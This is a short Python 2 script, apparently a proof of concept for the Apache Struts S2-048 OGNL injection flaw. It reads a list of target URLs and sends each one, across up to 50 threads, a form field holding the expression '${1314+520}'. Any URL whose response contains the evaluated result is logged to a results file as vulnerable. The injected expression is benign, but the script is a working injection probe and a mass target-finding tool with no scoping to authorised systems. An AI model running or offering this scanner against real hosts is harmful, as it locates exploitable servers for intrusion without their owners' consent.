# -*- encoding: utf-8 -*-
# !/usr/bin/env python
# desc: Struts-048
# link: http://bobao.360.cn/learning/detail/4078.html
import urllib
import urllib2
import threading


def poc(url):
    try:
        test_data = {'name': '${1314+520}', 'age': 22, '__checkbox_bustedBefore': 'true', 'description': 'feifei'}
        test_data_urlencode = urllib.urlencode(test_data)
        requrl = url
        req = urllib2.Request(url=requrl, data=test_data_urlencode)
        res_data = urllib2.urlopen(req)
        body = res_data.read()
    except:
        body = ""
    if "1834" in body:
        print u"[*]发现Struts 048漏洞，地址为:", url
        f.write(url + "\n")


if __name__ == "__main__":
    f = open("result.txt", "a")
    url_list = [i.replace("\n", "") for i in open("url.txt", "r").readlines()]
    for url in url_list:
        threading.Thread(target=poc, args=(url,)).start()
        while 1:
            if (len(threading.enumerate()) < 50):
                break
